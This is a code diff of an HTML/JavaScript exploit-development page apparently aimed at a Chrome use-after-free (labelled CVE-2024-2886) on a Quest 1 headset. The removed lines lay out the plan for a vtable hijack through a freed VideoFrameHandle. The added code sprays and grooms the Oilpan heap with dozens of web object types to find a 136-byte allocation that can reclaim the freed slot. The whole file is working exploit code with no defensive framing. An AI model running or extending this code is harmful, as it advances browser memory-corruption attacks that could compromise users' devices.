@@ -5,109 +5,116 @@
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
-log('CVE-2024-2886 - vtable hijack attempt');
+log('Oilpan size oracle — finding 136-byte match');
 log('');
 
-// WHAT WE KNOW:
-// - VideoFrameHandle freed by close() → Oilpan 136-byte slot
-// - vtable dispatch at libchrome.so+0x29358d4: ldr x8,[x20]; ldr x8,[x8,#0x20]; blr x8
-// - x20 = freed VideoFrameHandle
-// - offset 0 of handle = vtable ptr
-// - vtable+0x20 = function pointer called with x0=handle, args from CopyToOptions
-//
-// GOAL: reclaim freed VideoFrameHandle with controlled data
-// so vtable ptr at offset 0 points to our fake vtable
-// and fake vtable[0x20] points to... what?
-//
-// On Quest 1 (ARM64, no PAC), we just need any code address.
-// The browser has shell_exec. But we're in the RENDERER, not browser process.
-// Even so, crash = tombstone = we learn the freed object address.
-
-async function attempt() {
+async function testObject(label, makeObj) {
     const canvas = new OffscreenCanvas(64, 64);
     const gl = canvas.getContext('webgl');
-    const audioCtx = new AudioContext();
-
-    // Baseline
     gl.clearColor(1.0, 0.0, 0.0, 1.0);
     gl.clear(gl.COLOR_BUFFER_BIT);
     gl.finish();
+
+    // baseline
     const bf = new VideoFrame(canvas, {timestamp:0});
     const bb = new Uint8Array(bf.allocationSize());
     await bf.copyTo(bb); bf.close();
-    log('baseline: ' + Array.from(bb.slice(0,4)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
 
-    // Try multiple grooming objects - GainNode, OscillatorNode, AnalyserNode
-    // One of them might be 136 bytes in Chrome 112 Oilpan
-    const nodeTypes = ['gain', 'oscillator', 'analyser'];
-    
-    for (const type of nodeTypes) {
-        log('trying ' + type + ' node grooming...');
-        
-        // Free 2000 slots
-        const nodes = [];
-        for (let i = 0; i < 2000; i++) {
-            if (type === 'gain') nodes.push(audioCtx.createGain());
-            else if (type === 'oscillator') nodes.push(audioCtx.createOscillator());
-            else nodes.push(audioCtx.createAnalyser());
-        }
-        nodes.length = 0;
+    // free 3000 slots
+    const objs = [];
+    for (let i = 0; i < 3000; i++) objs.push(makeObj(i));
+    objs.length = 0;
 
-        let groomed = 0;
-        for (let a = 0; a < 30; a++) {
-            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
-            const f = new VideoFrame(canvas, {timestamp: a*1000});
-            const buf = new Uint8Array(f.allocationSize());
-            const p = f.copyTo(buf);
-            f.close();
-            // spray
-            const s = [];
-            for (let j=0;j<20;j++) {
-                if (type==='gain') s.push(audioCtx.createGain());
-                else if (type==='oscillator') s.push(audioCtx.createOscillator());
-                else s.push(audioCtx.createAnalyser());
-            }
-            await p; s.length=0;
-            if (buf.some((b,i)=>b!==bb[i])) {
-                groomed++;
-                log('  [!] GROOMED with ' + type + ' on attempt ' + a);
-                log('  bytes: ' + Array.from(buf.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-            }
-        }
-        log('  result: ' + groomed + '/30 groomed with ' + type);
+    let groomed = 0;
+    for (let a = 0; a < 30; a++) {
+        gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
+        const f = new VideoFrame(canvas, {timestamp: a*1000});
+        const buf = new Uint8Array(f.allocationSize());
+        const p = f.copyTo(buf);
+        f.close();
+        const s = [];
+        for (let j = 0; j < 30; j++) s.push(makeObj(j));
+        await p;
+        s.length = 0;
+        if (buf.some((b,i) => b !== bb[i])) groomed++;
     }
 
-    // Also try EncodedVideoChunk and AudioData
-    log('trying EncodedVideoChunk...');
-    {
-        const chunks = [];
-        const fakeData = new Uint8Array(32).fill(0x41);
-        for (let i=0;i<2000;i++) {
-            chunks.push(new EncodedVideoChunk({type:'key',timestamp:i,data:fakeData}));
+    const result = groomed + '/30';
+    log((groomed > 0 ? '[HIT] ' : '[ -- ] ') + label + ': ' + result);
+    return groomed;
+}
+
+async function run() {
+    const ctx = new AudioContext();
+
+    const tests = [
+        ['AudioParam',      i => ctx.createGain().gain],
+        ['TextDecoder',     i => new TextDecoder()],
+        ['TextEncoder',     i => new TextEncoder()],
+        ['DOMMatrix',       i => new DOMMatrix()],
+        ['DOMPoint',        i => new DOMPoint()],
+        ['DOMRect',         i => new DOMRect()],
+        ['AbortController', i => new AbortController()],
+        ['AbortSignal',     i => new AbortController().signal],
+        ['URL',             i => new URL('https://x.com/' + i)],
+        ['URLSearchParams', i => new URLSearchParams('a=' + i)],
+        ['Headers',         i => new Headers({'x-test': String(i)})],
+        ['Request',         i => new Request('https://x.com/' + i)],
+        ['MessageChannel',  i => new MessageChannel()],
+        ['MessagePort',     i => new MessageChannel().port1],
+        ['Blob',            i => new Blob(['x'.repeat(i % 64)])],
+        ['File',            i => new File(['x'], 'f'+i)],
+        ['FormData',        i => new FormData()],
+        ['EncodedAudioChunk', i => {
+            try {
+                return new EncodedAudioChunk({type:'key',timestamp:i,data:new Uint8Array(4)});
+            } catch(e) { return null; }
+        }],
+        ['AudioData',       i => {
+            try {
+                return new AudioData({format:'f32',sampleRate:44100,numberOfFrames:128,numberOfChannels:1,timestamp:i,data:new Float32Array(128)});
+            } catch(e) { return null; }
+        }],
+        ['VideoFrame canvas', i => {
+            const c = new OffscreenCanvas(4,4);
+            const f = new VideoFrame(c, {timestamp:i});
+            return f;
+        }],
+        ['ImageData',       i => new ImageData(8, 8)],
+        ['ImageBitmap',     i => null], // async, skip
+        ['PerformanceMark', i => { try { return performance.mark('m'+i); } catch(e){return null;} }],
+        ['ReadableStream',  i => new ReadableStream()],
+        ['WritableStream',  i => new WritableStream()],
+        ['TransformStream', i => new TransformStream()],
+        ['EventTarget',     i => new EventTarget()],
+        ['CustomEvent',     i => new CustomEvent('x', {detail: i})],
+        ['MutationObserver',i => new MutationObserver(()=>{})],
+        ['IntersectionObserver', i => { try { return new IntersectionObserver(()=>{}); } catch(e){return null;} }],
+        ['ResizeObserver',  i => new ResizeObserver(()=>{})],
+    ];
+
+    let hits = [];
+    for (const [label, maker] of tests) {
+        try {
+            const groomed = await testObject(label, maker);
+            if (groomed > 0) hits.push(label);
+        } catch(e) {
+            log('[ EE ] ' + label + ': ' + e.message);
         }
-        chunks.length=0;
-        let groomed=0;
-        for (let a=0;a<20;a++) {
-            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
-            const f=new VideoFrame(canvas,{timestamp:a*1000});
-            const buf=new Uint8Array(f.allocationSize());
-            const p=f.copyTo(buf); f.close();
-            const s=[];
-            for(let j=0;j<20;j++) s.push(new EncodedVideoChunk({type:'key',timestamp:j,data:fakeData}));
-            await p; s.length=0;
-            if(buf.some((b,i)=>b!==bb[i])){groomed++;log('  [!] EncodedVideoChunk groomed attempt '+a);}
-        }
-        log('  result: '+groomed+'/20');
     }
 
     log('');
-    log('If any type shows groomed > 0:');
-    log('That type is our spray object!');
-    log('Next: control the content of that object');
-    log('to fake vtable ptr at byte 0 of the 136-byte slot');
+    log('HITS: ' + (hits.length > 0 ? hits.join(', ') : 'none'));
+    if (hits.length > 0) {
+        log('These objects share 136-byte Oilpan bucket with VideoFrameHandle!');
+        log('Use them for vtable hijack grooming.');
+    } else {
+        log('No hits. VideoFrameHandle may be in a non-standard Oilpan arena.');
+        log('Try timing-based size oracle next.');
+    }
 }
 
-attempt().catch(e=>log('ERR: '+e));
+run().catch(e => log('ERR: ' + e));
 </script>
 </body>
 </html>
